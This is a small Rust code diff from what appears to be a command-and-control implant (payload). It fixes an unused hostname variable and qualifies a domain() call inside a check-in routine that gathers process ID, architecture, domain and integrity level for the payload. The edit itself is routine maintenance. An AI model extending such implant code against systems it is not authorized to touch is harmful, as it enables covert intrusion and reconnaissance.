@@ -129,7 +129,7 @@ pub mod whoami {
                 return Some("WORKGROUP".to_string());
             }
 
-            let hostname = std::ffi::OsString::from_wide(&name)
+            let _hostname = std::ffi::OsString::from_wide(&name)
                 .to_string_lossy()
                 .to_string();
             
@@ -321,7 +321,7 @@ pub fn get_checkin_info() -> String {
         pid: std::process::id(),
         uuid: crate::payloadvars::payload_uuid(),
         architecture: std::env::consts::ARCH.to_string(),
-        domain: domain(),
+        domain: whoami::domain(),
         integrity_level: whoami::get_integrity_level(),
     };
 
